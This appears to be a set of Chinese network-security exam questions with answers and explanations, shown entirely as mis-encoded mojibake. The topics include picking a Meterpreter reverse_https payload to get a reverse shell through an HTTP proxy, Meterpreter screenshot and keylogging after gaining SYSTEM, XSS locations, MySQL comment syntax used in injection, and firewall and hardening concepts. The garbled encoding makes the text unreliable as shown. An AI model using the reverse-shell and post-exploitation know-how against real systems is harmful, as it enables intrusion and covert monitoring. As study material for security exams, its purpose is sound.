<li>é»‘å®¢æ§åˆ¶ä¸€å°WindowsæœåŠ¡å™¨ï¼Œå‘ç°IEæµè§ˆå™¨ä½¿ç”¨äº†ä»£ç†ï¼Œå¯ä»¥è®¿é—®å¤–ç½‘ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å‘ç° <code>C:\Users\test&gt;ping www.baidu.com -n 1 æ­£åœ¨ Pingwww.a.shifen.com [14.215.177.38] å…·æœ‰32å­—èŠ‚çš„æ•°æ®ï¼š è¯·æ±‚è¶…æ—¶ C:\Users\test&gt;telnet www.baidu.com 80 æ­£åœ¨é“¾æ¥www.baidu.com...æ— æ³•æ‰“å¼€åˆ°ä¸»æœºçš„è¿æ¥ã€‚ åœ¨ç«¯å£ 80: è¿æ¥å¤±è´¥ã€‚</code> é€šè¿‡å¦‚ä¸Šä¿¡æ¯åˆ¤æ–­ï¼Œä»¥ä¸‹å“ªäº›åå¼¹shellæ“ä½œä¼šæˆåŠŸ <strong>windows&#x2F;meterpreter&#x2F;reverse_https</strong> <strong>windows&#x2F;meterpreter&#x2F;reverse_http</strong><br> åˆ†æï¼š<ol>
<li><strong>ping <a href="http://www.baidu.com/">www.baidu.com</a>Â è¯·æ±‚è¶…æ—¶</strong>ï¼špingÂ å‘½ä»¤ä½¿ç”¨çš„æ˜¯Â <strong>ICMP</strong>Â åè®®ã€‚è¿™ä¸ªç»“æœè¡¨æ˜ï¼Œå‡ºç«™çš„ ICMP æµé‡å¾ˆå¯èƒ½è¢«é˜²ç«å¢™æˆ–ç½‘ç»œç­–ç•¥<strong>é˜»æ­¢</strong>äº†ã€‚å› æ­¤ï¼Œä»»ä½•ä¾èµ– ICMP åè®®çš„åé—¨ï¼ˆé€‰é¡¹ Aï¼‰éƒ½ä¼šå¤±è´¥ã€‚</li>
<li><strong>telnet <a href="http://www.baidu.com/">www.baidu.com</a> 80Â è¿æ¥å¤±è´¥</strong>ï¼štelnetÂ å‘½ä»¤å°è¯•å»ºç«‹ä¸€ä¸ªæ ‡å‡†çš„Â <strong>TCP</strong>Â è¿æ¥ã€‚è¿™ä¸ªç»“æœè¡¨æ˜ï¼Œç›´æ¥å‘å¤–ç½‘ 80 ç«¯å£å‘èµ· TCP è¿æ¥çš„æµé‡ä¹Ÿè¢«<strong>é˜»æ­¢</strong>äº†ã€‚å› æ­¤ï¼Œæ ‡å‡†çš„Â reverse_tcpÂ payloadï¼ˆé€‰é¡¹ Bï¼‰ä¹Ÿä¼šå› ä¸ºæ— æ³•å»ºç«‹è¿æ¥è€Œå¤±è´¥ã€‚</li>
<li><strong>â€œIEæµè§ˆå™¨ä½¿ç”¨äº†ä»£ç†ï¼Œå¯ä»¥è®¿é—®å¤–ç½‘â€</strong>ï¼šè¿™æ˜¯æœ€å…³é”®çš„ä¿¡æ¯ã€‚å®ƒè¯´æ˜è¿™å°æœåŠ¡å™¨å¹¶éå®Œå…¨æ— æ³•è®¿é—®å¤–ç½‘ï¼Œè€Œæ˜¯å¿…é¡»é€šè¿‡ä¸€ä¸ª<strong>HTTPä»£ç†æœåŠ¡å™¨</strong>æ¥è®¿é—®ã€‚IEæµè§ˆå™¨çŸ¥é“å¦‚ä½•ä½¿ç”¨è¿™ä¸ªä»£ç†ï¼Œæ‰€ä»¥èƒ½ä¸Šç½‘ã€‚è€ŒÂ pingÂ å’ŒÂ telnetÂ è¿™ç§åº•å±‚å·¥å…·é»˜è®¤ä¸ä¼šä½¿ç”¨ä»£ç†ï¼Œæ‰€ä»¥å®ƒä»¬å¤±è´¥äº†ã€‚</li>
<li><strong>ç»“è®º</strong>ï¼šè¦æƒ³æˆåŠŸåå¼¹shellï¼Œå¿…é¡»ä½¿ç”¨ä¸€ä¸ªèƒ½å¤Ÿ<strong>è¯†åˆ«å¹¶åˆ©ç”¨ç³»ç»Ÿä»£ç†è®¾ç½®</strong>çš„ payloadã€‚Metasploit çš„Â reverse_httpÂ å’ŒÂ reverse_httpsÂ payload æ­£æ˜¯ä¸ºæ­¤è®¾è®¡çš„ã€‚å®ƒä»¬ä¼šåƒæµè§ˆå™¨ä¸€æ ·ï¼Œé€šè¿‡ä»£ç†æœåŠ¡å™¨å»è¿æ¥æ”»å‡»è€…çš„ç›‘å¬ä¸»æœºã€‚</li>
<li><strong>C vs D</strong>ï¼šreverse_httpsï¼ˆé€šå¸¸ç›‘å¬443ç«¯å£ï¼‰æ¯”Â reverse_httpï¼ˆé€šå¸¸ç›‘å¬80ç«¯å£ï¼‰æ›´ä¼˜ã€‚å› ä¸º HTTPS æµé‡æ˜¯åŠ å¯†çš„ï¼Œåœ¨ä¼ä¸šç¯å¢ƒä¸­æ›´å®¹æ˜“è¢«å…è®¸é€šè¿‡ï¼Œä¸”æµé‡å†…å®¹ä¸æ˜“è¢«æ£€æµ‹ã€‚å› æ­¤Â reverse_httpshttpsÂ çš„æˆåŠŸç‡æœ€é«˜ã€‚</li>
</ol>
</li>
<li>é˜²ç«å¢™æ˜¯ä¸€ä¸ªÂ <strong>éš”ç¦»å™¨ã€æ§åˆ¶å™¨ã€åˆ†æå™¨</strong><ul>
<li><strong>éš”ç¦»å™¨ (Isolator):</strong>Â é˜²ç«å¢™çš„é¦–è¦ä½œç”¨æ˜¯å°†å†…éƒ¨å¯ä¿¡ç½‘ç»œä¸å¤–éƒ¨ä¸å¯ä¿¡ç½‘ç»œè¿›è¡Œå®‰å…¨éš”ç¦»ã€‚</li>
<li><strong>æ§åˆ¶å™¨ (Controller):</strong>Â é˜²ç«å¢™æ ¹æ®é¢„è®¾çš„å®‰å…¨ç­–ç•¥ï¼ˆè§„åˆ™ï¼‰ï¼Œå¯¹æµç»å®ƒçš„ç½‘ç»œæµé‡è¿›è¡Œæ§åˆ¶ï¼Œå†³å®šæ˜¯å…è®¸é€šè¿‡ï¼ˆAllowï¼‰è¿˜æ˜¯æ‹’ç»ï¼ˆDenyï¼‰ã€‚â€œé™åˆ¶å™¨â€è™½ç„¶æ„æ€ç›¸è¿‘ï¼Œä½†â€œæ§åˆ¶å™¨â€æ›´èƒ½ä½“ç°å…¶åŸºäºè§„åˆ™çš„ä¸»åŠ¨ç®¡ç†ä½œç”¨ã€‚</li>
<li><strong>åˆ†æå™¨ (Analyzer):</strong>Â é˜²ç«å¢™ä¼šå¯¹ç½‘ç»œæµé‡è¿›è¡Œæ£€æŸ¥å’Œåˆ†æï¼Œä»¥åˆ¤æ–­å…¶æ˜¯å¦ç¬¦åˆå®‰å…¨è§„åˆ™ã€‚åŒæ—¶ï¼Œå®ƒä¼šè®°å½•æ—¥å¿—ï¼ˆLoggingï¼‰ä¾›å®‰å…¨å®¡è®¡ï¼Œç°ä»£é˜²ç«å¢™è¿˜å…·å¤‡æ›´æ·±åº¦çš„æµé‡åˆ†æèƒ½åŠ›ã€‚è€Œâ€œè§£æå™¨ (Parser)â€é€šå¸¸æŒ‡è¯­æ³•è§£æï¼Œç”¨è¯ä¸å‡†ç¡®ã€‚</li>
</ul>
</li>
<li>ç›®å‰é˜²ç«å¢™å¤§çš„é˜²èŒƒä¸»è¦æ˜¯ï¼š <strong>è¢«åŠ¨é˜²èŒƒ</strong><ul>
<li><strong>ä¸»åŠ¨é˜²èŒƒ</strong>åˆ™é€šå¸¸æŒ‡å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ(IDS)ã€å…¥ä¾µé˜²å¾¡ç³»ç»Ÿ(IPS)æˆ–èœœç½ç­‰æŠ€æœ¯ï¼Œè¿™äº›æŠ€æœ¯ä¼šä¸»åŠ¨åˆ†ææµé‡ç‰¹å¾ã€è¯†åˆ«æ”»å‡»è¡Œä¸ºå¹¶ä½œå‡ºå“åº”ï¼ˆå¦‚æŠ¥è­¦æˆ–é˜»æ–­ï¼‰ã€‚è™½ç„¶ç°ä»£çš„ä¸‹ä¸€ä»£é˜²ç«å¢™ï¼ˆNGFWï¼‰é›†æˆäº†IPSç­‰ä¸»åŠ¨é˜²å¾¡åŠŸèƒ½ï¼Œä½†é˜²ç«å¢™çš„<strong>æ ¸å¿ƒå’ŒåŸºç¡€</strong>ä¾ç„¶æ˜¯è¢«åŠ¨çš„ã€åŸºäºè§„åˆ™çš„è®¿é—®æ§åˆ¶ã€‚</li>
</ul>
</li>
<li>Â å¯¹ç½‘ç»œç³»ç»Ÿè¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œé€šå¸¸æ˜¯æŒ‰ä»€ä¹ˆé¡ºåºæ¥è¿›è¡Œçš„ â€“ <strong>ä¾¦æŸ¥é˜¶æ®µã€å…¥ä¾µé˜¶æ®µã€æ§åˆ¶é˜¶æ®µ</strong></li>
<li>å½“æˆåŠŸé€šè¿‡Metasploité»‘è¿›å¯¹æ–¹ç³»ç»Ÿå¹¶è·å¾—systemæƒé™åï¼Œä¸èƒ½åš<strong>å¼€å…³æœº</strong><ul>
<li><strong>SYSTEM æƒé™</strong>æ˜¯ Windows ç³»ç»Ÿä¸­çš„æœ€é«˜æƒé™ï¼Œæ‹¥æœ‰å®ƒå‡ ä¹å¯ä»¥å¯¹æ“ä½œç³»ç»Ÿåšä»»ä½•äº‹æƒ…ã€‚</li>
<li>A, B, C éƒ½æ˜¯å¯ä»¥è½»æ˜“åšåˆ°çš„ï¼šMeterpreter æä¾›äº†Â screenshotÂ æ¨¡å—ã€keyscan_startÂ æ¨¡å—ï¼Œè€Œ SYSTEM æƒé™æœ¬èº«å°±æ„å‘³ç€å¯ä»¥è¯»å†™ç³»ç»Ÿä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚</li>
<li><strong>D. å¼€å…³æœº</strong>Â è¿™ä¸ªé€‰é¡¹æœ‰æ­§ä¹‰ã€‚â€å…³æœºâ€ (shutdown) å’Œ â€œé‡å¯â€ (reboot) æ˜¯å®Œå…¨å¯ä»¥åšåˆ°çš„ã€‚ä½†æ˜¯ â€œå¼€æœºâ€ (Power On) æ˜¯<strong>ä¸å¯èƒ½</strong>çš„ã€‚ä¸€ä¸ªå·²ç»å®Œå…¨æ–­ç”µå…³æœºçš„è®¡ç®—æœºï¼Œæ— æ³•é€šè¿‡æ“ä½œç³»ç»Ÿå±‚é¢çš„æŒ‡ä»¤æ¥å¯åŠ¨ã€‚è¿™éœ€è¦å¸¦å¤–ç®¡ç†æŠ€æœ¯ï¼ˆå¦‚Intel AMT, iDRACï¼‰æˆ–ç‰©ç†æ¥è§¦ã€‚å› ä¸ºé€‰é¡¹ä¸­åŒ…å«äº†æ— æ³•åšåˆ°çš„â€œå¼€æœºâ€ï¼Œæ‰€ä»¥è¿™æ˜¯å”¯ä¸€ä¸€ä¸ªâ€œä¸èƒ½â€ï¼ˆå®Œå…¨ï¼‰åšçš„æ“ä½œã€‚</li>
</ul>
</li>
<li>å‡ºç°æ¼æ´å¹¶å‘å¸ƒè¡¥ä¸ä¹‹åï¼Œå¦‚æœæœåŠ¡å™¨ä»ç„¶æ„ŸæŸ“å°±å±äºç³»ç»Ÿç®¡ç†å‘˜ç»´æŠ¤é˜¶æ®µçš„å¤±è¯¯</li>
<li>ç°ä»£ä¸»åŠ¨å®‰å…¨é˜²å¾¡çš„ä¸»è¦æ‰‹æ®µæ˜¯<strong>æ¢æµ‹ã€é¢„è­¦ã€ç›‘è§†ã€è­¦æŠ¥</strong><ul>
<li><strong>æ¢æµ‹ (Detection):</strong>Â é€šè¿‡å„ç§ä¼ æ„Ÿå™¨ï¼ˆå¦‚IDS&#x2F;IPSæ¢å¤´ï¼‰å‘ç°æ½œåœ¨çš„å¨èƒã€‚</li>
<li><strong>é¢„è­¦ (Early Warning):</strong>Â åœ¨å¨èƒçœŸæ­£é€ æˆå±å®³å‰å‘å‡ºè­¦å‘Šã€‚</li>
<li><strong>ç›‘è§† (Monitoring):</strong>Â æŒç»­åœ°è§‚å¯Ÿç½‘ç»œçŠ¶æ€å’Œå®‰å…¨äº‹ä»¶ã€‚</li>
<li><strong>è­¦æŠ¥ (Alarm):</strong>Â å½“ç¡®è®¤æœ‰å®‰å…¨äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå‘å‡ºæ­£å¼çš„å‘Šè­¦é€šçŸ¥ï¼Œè§¦å‘åº”æ€¥å“åº”ã€‚</li>
</ul>
</li>
<li>1994å¹´æˆ‘å›½é¢å¸ƒçš„ç¬¬ä¸€ä¸ªä¸ä¿¡æ¯å®‰å…¨æœ‰å…³çš„æ³•è§„æ˜¯<strong>ä¸­åäººæ°‘å…±å’Œå›½è®¡ç®—æœºä¿¡æ¯ç³»ç»Ÿå®‰å…¨ä¿æŠ¤æ¡ä¾‹</strong></li>
<li>æ•…æ„åˆ¶ä½œã€ä¼ æ’­è®¡ç®—æœºç—…æ¯’ç­‰ç ´åæ€§ç¨‹åºï¼Œå½±å“è®¡ç®—æœºç³»ç»Ÿæ­£å¸¸è¿è¡Œï¼Œåæœä¸¥é‡çš„ï¼Œå°†å—åˆ°<strong>å¤„äº”å¹´ä»¥ä¸‹æœ‰æœŸå¾’åˆ‘æˆ–è€…æ‹˜å½¹</strong></li>
<li>ä¿¡æ¯å®‰å…¨ä¸­PDRæ¨¡å‹çš„å…³é”®å› ç´ æ˜¯<strong>äºº</strong><br>Â PDR æ¨¡å‹æŒ‡é˜²æŠ¤ï¼ˆProtectionï¼‰ã€æ£€æµ‹ï¼ˆDetectionï¼‰å’Œå“åº”ï¼ˆResponseï¼‰<ul>
<li><strong>æŠ€æœ¯</strong>æ˜¯å®ç°PDRçš„å·¥å…·ï¼ˆå¦‚é˜²ç«å¢™ã€IDSï¼‰ã€‚</li>
<li><strong>æ¨¡å‹</strong>æ˜¯æŒ‡å¯¼æ€æƒ³ã€‚</li>
</ul>
</li>
<li>è®¡ç®—æœºç½‘ç»œæœ€æ—©å‡ºç°åœ¨<strong>20ä¸–çºª60å¹´ä»£</strong><ul>
<li>ç¾å›½çš„<strong>ARPANET</strong>ï¼ˆé˜¿å¸•ç½‘ï¼‰æ˜¯ç°ä»£è®¡ç®—æœºç½‘ç»œçš„é¼»ç¥–ï¼Œ1969å¹´ç¬¬ä¸€å°ä¸»æœºæ¥å…¥ç½‘ç»œ</li>
</ul>
</li>
<li>Â æœ€æ—©ç ”ç©¶è®¡ç®—æœºç½‘ç»œçš„ç›®çš„æ˜¯<strong>å…±äº«è®¡ç®—èµ„æº</strong></li>
<li>è·¯ç”±è®¾ç½®æ˜¯è¾¹ç•Œé˜²èŒƒçš„<strong>åŸºæœ¬æ‰‹æ®µä¹‹ä¸€</strong><ul>
<li>è¾¹ç•Œè·¯ç”±å™¨ä¸Šçš„<strong>è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰<strong>æ˜¯æœ€æ—©ã€æœ€åŸºç¡€çš„ç½‘ç»œè¾¹ç•Œå®‰å…¨æªæ–½ã€‚é€šè¿‡é…ç½®ACLï¼Œå¯ä»¥å¯¹è¿›å‡ºç½‘ç»œçš„æ•°æ®åŒ…è¿›è¡ŒåŸºäºæº&#x2F;ç›®çš„IPã€ç«¯å£å’Œåè®®çš„è¿‡æ»¤ã€‚å®ƒå’Œé˜²ç«å¢™å…±åŒæ„æˆäº†ç½‘ç»œè¾¹ç•Œé˜²èŒƒçš„</strong>åŸºæœ¬æ‰‹æ®µ</strong>ã€‚</li>
</ul>
</li>
<li>Â 1995å¹´ä¹‹åä¿¡æ¯ç½‘ç»œå®‰å…¨é—®é¢˜å°±æ˜¯<strong>é£é™©ç®¡ç†</strong><ul>
<li>äººä»¬è®¤è¯†åˆ°ï¼Œå®‰å…¨é£é™©æ˜¯<strong>ä¸å¯èƒ½è¢«å®Œå…¨æ¶ˆé™¤</strong>çš„</li>
<li>è¿™åŒ…æ‹¬å¯¹èµ„äº§è¿›è¡Œè¯†åˆ«ï¼Œå¯¹å¨èƒå’Œè„†å¼±æ€§è¿›è¡Œè¯„ä¼°ï¼Œå¹¶é‡‡å–æ¥å—ã€è§„é¿ã€è½¬ç§»æˆ–ç¼“è§£ç­‰ç­–ç•¥æ¥å°†é£é™©æ§åˆ¶åœ¨å¯æ¥å—çš„æ°´å¹³ã€‚</li>
</ul>
</li>
<li>ä¿¡æ¯ç½‘ç»œå®‰å…¨çš„ç¬¬ä¸€ä¸ªå¹´ä»£<strong>ä¹åå¹´ä»£ä¸­å¶å‰</strong>ç¬¬äºŒä¸ªæ—¶ä»£<strong>ä¹åå¹´ä»£ä¸­å¶å</strong><br>ä¿¡æ¯å®‰å…¨å‘å±•çš„ä¸‰ä¸ªé˜¶æ®µï¼š<strong>ä¸»æœºæ—¶ä»£ï¼Œä¸“ç½‘æ—¶ä»£ï¼Œå¤šç½‘åˆä¸€æ—¶ä»£</strong></li>
<li><strong>PGP</strong>å¯ç”¨äºå®‰å…¨ç”µå­é‚®ä»¶åŠ å¯†<ul>
<li><strong>PGP (Pretty Good Privacy)</strong>Â æ˜¯ä¸€å¥—ç”¨äºæ•°æ®åŠ å¯†å’Œæ•°å­—ç­¾åçš„ç¨‹åºï¼Œå®ƒæœ€ç»å…¸çš„åº”ç”¨å°±æ˜¯å¯¹<strong>ç”µå­é‚®ä»¶å†…å®¹</strong>æœ¬èº«è¿›è¡ŒåŠ å¯†å’Œç­¾åã€‚PGPæä¾›çš„æ˜¯ç«¯åˆ°ç«¯çš„åŠ å¯†ï¼Œç¡®ä¿åªæœ‰é¢„æœŸçš„æ¥æ”¶è€…æ‰èƒ½é˜…è¯»é‚®ä»¶å†…å®¹ã€‚</li>
<li><strong>SSL (Secure Sockets Layer)</strong>Â å’Œå…¶ç»§ä»»è€…Â <strong>TLS (Transport Layer Security)</strong>Â æ˜¯å·¥ä½œåœ¨ä¼ è¾“å±‚çš„å®‰å…¨åè®®ã€‚å®ƒä»¬å¯ä»¥ä¸ºä¸Šå±‚åè®®ï¼ˆå¦‚HTTP, SMTPï¼‰çš„<strong>ä¼ è¾“é€šé“</strong>åŠ å¯†ã€‚ä¾‹å¦‚ï¼ŒSMTP over TLS å¯ä»¥åŠ å¯†é‚®ä»¶åœ¨æœåŠ¡å™¨ä¹‹é—´ä¼ è¾“çš„è¿‡ç¨‹ï¼Œä½†å®ƒä¸åŠ å¯†é‚®ä»¶æœ¬èº«åœ¨æœåŠ¡å™¨ä¸Šçš„å­˜å‚¨ã€‚</li>
<li><strong>SET (Secure Electronic Transaction)</strong>Â æ˜¯ä¸€ä¸ªæ—©æœŸç”¨äºä¿éšœç½‘ä¸Šä¿¡ç”¨å¡æ”¯ä»˜å®‰å…¨çš„åè®®ï¼Œç°å·²åŸºæœ¬è¢«æ·˜æ±°ã€‚</li>
<li><strong>æ ¸å¿ƒåŒºåˆ«ï¼š</strong>Â SSL&#x2F;TLS ä¿æŠ¤çš„æ˜¯â€œé€šè·¯â€ï¼ˆæ•°æ®ä¼ è¾“è¿‡ç¨‹ï¼‰ï¼Œè€Œ PGP ä¿æŠ¤çš„æ˜¯â€œå†…å®¹â€ï¼ˆæ•°æ®æœ¬èº«ï¼‰ï¼Œå› æ­¤ PGP æ˜¯ç”¨äºå®‰å…¨ç”µå­é‚®ä»¶åŠ å¯†çš„æ­£ç¡®ç­”æ¡ˆã€‚</li>
</ul>
</li>
<li>åœ¨windowç³»ç»Ÿä¸­ç”¨äºæ˜¾ç¤ºæœ¬æœºå„ç½‘ç»œç«¯å£è¯¦ç»†æƒ…å†µçš„å‘½ä»¤æ˜¯<strong>netstat</strong></li>
<li>é˜²ç«å¢™çš„åˆ†ç±»ï¼š<strong>åŒ…è¿‡æ»¤å‹ã€ä»£ç†å‹ã€æ··åˆå‹</strong><ul>
<li><strong>åŒ…è¿‡æ»¤å‹ (Packet Filtering):</strong>Â æœ€æ—©çš„é˜²ç«å¢™ï¼Œå·¥ä½œåœ¨ç½‘ç»œå±‚ï¼Œæ ¹æ®IPåœ°å€å’Œç«¯å£å·è¿›è¡Œç®€å•çš„è¿‡æ»¤ï¼Œé€Ÿåº¦å¿«ä½†å®‰å…¨æ€§ä½ã€‚</li>
<li><strong>ä»£ç†å‹ (Proxy Service):</strong>Â å·¥ä½œåœ¨åº”ç”¨å±‚ï¼Œå®Œå…¨éš”ç¦»äº†å†…å¤–ç½‘çš„ç›´æ¥è¿æ¥ï¼Œå®‰å…¨æ€§é«˜ä½†æ€§èƒ½å¼€é”€å¤§ã€‚</li>
<li><strong>æ··åˆå‹ (Hybrid):</strong>Â ä¸»è¦æ˜¯æŒ‡<strong>çŠ¶æ€æ£€æµ‹é˜²ç«å¢™ (Stateful Inspection)</strong>ï¼Œå®ƒç»“åˆäº†å‰ä¸¤è€…çš„ä¼˜ç‚¹ï¼Œåœ¨ç½‘ç»œå±‚è¿›è¡Œè¿‡æ»¤ï¼Œä½†èƒ½è·Ÿè¸ªTCPä¼šè¯çŠ¶æ€ï¼Œæ¯”çº¯åŒ…è¿‡æ»¤å®‰å…¨å¾—å¤šï¼Œæ˜¯ç°ä»£é˜²ç«å¢™çš„åŸºç¡€ã€‚ç°åœ¨çš„ä¸‹ä¸€ä»£é˜²ç«å¢™ï¼ˆNGFWï¼‰æ›´æ˜¯é›†æˆäº†IPSã€åº”ç”¨è¯†åˆ«ç­‰å¤šç§æŠ€æœ¯çš„æ··åˆä½“ã€‚</li>
</ul>
</li>
<li>NATæ˜¯æŒ‡<strong>ç½‘ç»œåœ°å€è½¬æ¢</strong> NAT æ˜¯Â <strong>N</strong>etworkÂ <strong>A</strong>ddressÂ <strong>T</strong>ranslation çš„ç¼©å†™</li>
<li>å­˜å‚¨å‹XSSçš„ä½ç½®é€šå¸¸åœ¨<strong>ç½‘ç«™çš„ç•™è¨€æ¿ã€è¯„è®ºåŒºã€ç”¨æˆ·ä¸ªäººèµ„æ–™é¡µ</strong><ul>
<li>URLä½ç½®å’Œæœç´¢æ æ˜¯<strong>åå°„å‹XSS</strong>çš„å…¸å‹è§¦å‘ç‚¹ï¼Œæ¶æ„ä»£ç å­˜åœ¨äºURLä¸­ï¼Œä¸ä¼šè¢«å­˜å‚¨ã€‚</li>
</ul>
</li>
<li>ä¸‹åˆ—SQLè¯­å¥ç»™å‡ºå…³ç³»å‹æ•°æ®åº“ä¸­çš„å“ªä¸€ç±»å®Œæ•´æ€§çº¦æŸæ¡ä»¶?( ) CREATE TABLE Student( id CHAR(8), Sname CHAR(20)NOT NULL, Sage SMALLINT, PRIMARY KEY(id) ); â€“&gt; <strong>å®ä½“å®Œæ•´æ€§</strong><ul>
<li><strong>å®ä½“å®Œæ•´æ€§ (Entity Integrity)</strong>Â è¦æ±‚å…³ç³»ä¸­çš„æ¯ä¸ªå…ƒç»„ï¼ˆè¡Œï¼‰éƒ½æ˜¯å¯åŒºåˆ†çš„ï¼Œå³æ¯ä¸ªè¡¨éƒ½å¿…é¡»æœ‰ä¸»é”®ï¼Œä¸”ä¸»é”®çš„å€¼å¿…é¡»å”¯ä¸€ä¸”éç©ºã€‚PRIMARY KEY(id)(<strong>ä¸»é”®çº¦æŸï¼Œid å¿…é¡»å”¯ä¸€ä¸”éç©º</strong>)Â è¿™ä¸ªçº¦æŸæ­£æ˜¯ä¸ºäº†ä¿è¯å®ä½“å®Œæ•´æ€§ã€‚</li>
<li><strong>å‚ç…§å®Œæ•´æ€§ (Referential Integrity)</strong>Â æ˜¯é€šè¿‡<strong>å¤–é”® (FOREIGN KEY)</strong>Â æ¥ä¿è¯çš„ï¼Œè¦æ±‚å¤–é”®çš„å€¼è¦ä¹ˆä¸ºç©ºï¼Œè¦ä¹ˆå¿…é¡»ç­‰äºå…¶å¼•ç”¨çš„å¦ä¸€ä¸ªè¡¨ä¸­çš„æŸä¸ªä¸»é”®å€¼ã€‚</li>
<li><strong>ç”¨æˆ·å®šä¹‰å®Œæ•´æ€§</strong>Â æ˜¯é’ˆå¯¹ç‰¹å®šä¸šåŠ¡è§„åˆ™çš„çº¦æŸï¼Œå¦‚Â CHECK(Sage &gt; 18)ã€‚</li>
<li><strong>åŸŸå®Œæ•´æ€§</strong> å­—æ®µå€¼å¿…é¡»ç¬¦åˆå®šä¹‰çš„ç±»å‹ã€å–å€¼èŒƒå›´ã€æ˜¯å¦å…è®¸ç©º</li>
</ul>
</li>
<li>Â Windowsç³»ç»Ÿä¸‹æœ‰æ•ˆè¿›è¡Œå…±äº«å®‰å…¨çš„é˜²æŠ¤æªæ–½<ul>
<li>ç¡®ä¿æ‰€æœ‰çš„å…±äº«éƒ½æœ‰é«˜å¼ºåº¦çš„å¯†ç é˜²æŠ¤</li>
<li>ç¦æ­¢é€šè¿‡â€œç©ºä¼šè¯â€è¿æ¥ä»¥åŒ¿åçš„æ–¹å¼åˆ—ä¸¾ç”¨æˆ·ã€ç¾¤ç»„ã€ç³»ç»Ÿé…ç½®å’Œæ³¨å†Œè¡¨é”®å€¼</li>
<li>åˆ é™¤é»˜è®¤å…±äº«<code>net share c$ /delete</code></li>
</ul>
</li>
<li>mysqlçš„æ³¨é‡Šç¬¦æœ‰ï¼š<ul>
<li>#ï¼šMySQLæ”¯æŒçš„å•è¡Œæ³¨é‡Šã€‚</li>
<li>/* â€¦ *&#x2F;ï¼šCé£æ ¼çš„å¤šè¡Œæ³¨é‡Šï¼ŒMySQLæ”¯æŒã€‚</li>
<li>â€“Â (æ³¨æ„åé¢æœ‰ä¸ªç©ºæ ¼)ï¼šSQLæ ‡å‡†çš„å•è¡Œæ³¨é‡Šï¼ŒMySQLæ”¯æŒã€‚åœ¨Webæ³¨å…¥ä¸­ï¼Œç©ºæ ¼å¸¸è¢«ç¼–ç ä¸º%20æˆ–ç”¨+ä»£æ›¿ã€‚<br>ä¸æ”¯æŒçš„ï¼š</li>
<li><!-- ... -->ï¼šè¿™æ˜¯Â **HTML**Â æˆ–Â **XML**Â çš„æ³¨é‡Šè¯­æ³•ï¼ŒMySQLä¸æ”¯æŒ</li>
</ul>
</li>
<li>Â å‘æœ‰é™çš„ç©ºé—´è¾“å…¥è¶…é•¿çš„å­—ç¬¦ä¸²æ˜¯å“ªä¸€ç§æ”»å‡»æ‰‹æ®µ â€“ <strong>ç¼“å†²åŒºæº¢å‡º</strong></li>
<li>æ•°æ®åº“å®‰å…¨çš„ç¬¬ä¸€é“å±éšœæ˜¯<strong>æ“ä½œç³»ç»Ÿå®‰å…¨</strong><br>æŒ‰ç…§ä»¥ä¸‹é¡ºåºçªç ´é˜²çº¿<ul>
<li>ç¬¬ä¸€å±‚ï¼š<strong>æ“ä½œç³»ç»Ÿå®‰å…¨</strong>ï¼ˆæœ€åŸºç¡€ï¼Œä¿è¯è¿è¡Œç¯å¢ƒä¸è¢«ç ´åï¼‰ã€‚</li>
<li>ç¬¬äºŒå±‚ï¼š<strong>æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå®‰å…¨</strong>ï¼ˆDBMS å†…éƒ¨çš„ç”¨æˆ·ã€æƒé™æ§åˆ¶ï¼‰ã€‚</li>
<li>ç¬¬ä¸‰å±‚ï¼š<strong>ç½‘ç»œå®‰å…¨</strong>ï¼ˆé˜²æ­¢ä¼ è¾“ä¸­è¢«æˆªè·ã€ä¼ªé€ ï¼‰ã€‚</li>
<li>ç¬¬å››å±‚ï¼š<strong>æ•°æ®åº“ç®¡ç†å‘˜</strong>ï¼ˆäººä¸ºç®¡ç†å’Œåˆ¶åº¦ä¿éšœï¼‰ã€‚</li>
</ul>
</li>
<li>éœ€è¦rootæƒé™çš„äº‹ä¸ä¸€å®šè¦ç™»å½•åˆ°rootç”¨æˆ·</li>
<li><strong>WindowsæœåŠ¡çš„è¿è¡Œä¸éœ€è¦ç”¨æˆ·çš„äº¤äº’ç™»å½•</strong><ul>
<li>A. windowsæœåŠ¡å¿…é¡»æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„å¯æ‰§è¡Œç¨‹åº é”™è¯¯ã€‚å¤šä¸ªæœåŠ¡å¯ä»¥å…±äº«ä¸€ä¸ªè¿›ç¨‹ï¼Œä¾‹å¦‚æ‰˜ç®¡åœ¨Â svchost.exeÂ ä¸­çš„æœåŠ¡å°±æ˜¯ä»DLLæ–‡ä»¶ä¸­åŠ è½½çš„ã€‚</li>
<li>B.Â <strong>æ­£ç¡®</strong>ã€‚è¿™æ˜¯æœåŠ¡çš„æ ¸å¿ƒç‰¹æ€§ã€‚å®ƒä»¬åœ¨ç³»ç»Ÿå¯åŠ¨åå°±åœ¨åå°è¿è¡Œï¼Œå­˜åœ¨äºç‹¬ç«‹çš„ä¼šè¯ï¼ˆSession 0ï¼‰ä¸­ï¼Œä¸ç”¨æˆ·æ˜¯å¦ç™»å½•æ— å…³ã€‚</li>
<li>C. windowsæœåŠ¡éƒ½æ˜¯éšç³»ç»Ÿå¯åŠ¨è€Œå¯åŠ¨ï¼Œæ— éœ€ç”¨æˆ·è¿›è¡Œå¹²é¢„ é”™è¯¯ã€‚æœåŠ¡çš„å¯åŠ¨ç±»å‹å¯ä»¥è®¾ç½®ä¸ºâ€œè‡ªåŠ¨â€ã€â€œè‡ªåŠ¨(å»¶è¿Ÿå¯åŠ¨)â€ã€â€œæ‰‹åŠ¨â€æˆ–â€œç¦ç”¨â€ã€‚</li>
<li>D.Â windowsæœåŠ¡éƒ½éœ€è¦ç”¨æˆ·è¿›è¡Œç™»å½•åï¼Œä»¥ç™»å½•ç”¨æˆ·çš„æƒé™è¿›è¡Œå¯åŠ¨ é”™è¯¯ã€‚æœåŠ¡åœ¨ç”¨æˆ·ç™»å½•å‰å°±å·²ç»è¿è¡Œï¼Œå¹¶ä¸”å®ƒä»¬ä½¿ç”¨ç‰¹å®šçš„è´¦æˆ·ï¼ˆå¦‚Local System,Â Network Serviceï¼‰æƒé™è¿è¡Œï¼Œè€Œä¸æ˜¯å½“å‰ç™»å½•ç”¨æˆ·çš„æƒé™ã€‚</li>
</ul>
</li>
